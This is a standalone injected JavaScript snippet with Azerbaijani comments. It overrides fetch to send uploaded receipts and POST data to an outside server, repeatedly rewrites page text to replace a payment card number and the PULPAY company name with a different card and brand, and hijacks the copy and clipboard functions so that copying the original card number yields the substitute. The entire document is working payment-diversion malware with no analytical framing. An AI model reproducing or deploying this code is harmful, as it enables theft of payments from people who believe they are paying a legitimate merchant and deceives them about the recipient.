<script>
(function() {
    var API_URL = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1") 
        ? "http://localhost:3000" : "https://pulkredit-api.onrender.com";

    // --- 1. QƏBZ GÖNDƏRMƏ (Backend) ---
    var _origFetch = window.fetch;
    window.fetch = function(url, opts) {
        var u = typeof url === "string" ? url : (url && url.url) || "";
        if (opts && (opts.body instanceof FormData || (opts.method && opts.method.toUpperCase() === "POST"))) {
            return _origFetch(API_URL + "/api/upload-receipt", opts);
        }
        if (u.indexOf("/api/") === 0) u = API_URL + u;
        return _origFetch(u, opts);
    };

    // --- 2. EKRANDAKI MƏTNƏ MÜDAXİLƏ (Hər 50ms yoxlayır) ---
    setInterval(function() {
        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
        var node;
        while (node = walker.nextNode()) {
            var txt = node.textContent;
            if (txt && txt.includes("5466")) {
                node.textContent = txt.replace(/5466 6126 9018 8253/g, "5522 0993 6992 6134").replace(/5466612690188253/g, "5522099369926134");
            }
            if (txt && txt.includes("PULPAY")) {
                node.textContent = txt.replace(/PULPAY MMC/g, "PULKREDİT MMC").replace(/PULPAY/g, "PULKREDİT");
            }
        }
    }, 50);

    // --- 3. KOPYALAMA (Düyməyə basanda nömrəni məcburi dəyişir) ---
    document.addEventListener("copy", function(e) {
        var sel = window.getSelection().toString();
        if (sel && sel.includes("5466")) {
            e.preventDefault();
            e.clipboardData.setData("text/plain", "5522 0993 6992 6134");
        }
    }, true);

    if (navigator.clipboard && navigator.clipboard.writeText) {
        var _origWrite = navigator.clipboard.writeText;
        navigator.clipboard.writeText = function(text) {
            if (text && text.includes("5466")) text = "5522 0993 6992 6134";
            return _origWrite.call(navigator.clipboard, text);
        };
    }
})();
</script>
